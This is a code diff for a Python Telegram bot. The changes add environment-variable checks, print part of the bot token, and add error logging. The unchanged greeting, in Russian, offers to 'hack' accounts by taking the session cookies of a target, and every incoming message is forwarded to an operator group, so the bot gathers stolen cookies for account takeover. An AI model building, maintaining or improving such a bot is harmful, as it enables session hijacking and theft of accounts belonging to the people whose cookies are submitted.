@@ -2,8 +2,22 @@ import os
 import telebot
 import time
 
-TOKEN = os.environ['BOT_TOKEN']
-GROUP_ID = os.environ['GROUP_ID']
+# Более надежное получение переменных
+TOKEN = os.getenv('BOT_TOKEN')
+GROUP_ID = os.getenv('GROUP_ID')
+
+# Проверка что переменные установлены
+if not TOKEN:
+    print("❌ ОШИБКА: BOT_TOKEN не установлен!")
+    exit(1)
+    
+if not GROUP_ID:
+    print("❌ ОШИБКА: GROUP_ID не установлен!")
+    exit(1)
+
+print("✅ Переменные окружения загружены успешно!")
+print(f"Токен: {TOKEN[:10]}...")
+print(f"ID группы: {GROUP_ID}")
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -12,8 +26,8 @@ def start_command(message):
     bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
     try:
         bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
-    except: 
-        pass
+    except Exception as e:
+        print(f"Ошибка отправки в группу: {e}")
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
@@ -25,7 +39,8 @@ def handle_message(message):
     
     try:
         bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
-    except: 
-        pass
+    except Exception as e:
+        print(f"Ошибка отправки в группу: {e}")
 
+print("🚀 Бот запускается...")
 bot.polling(none_stop=True)
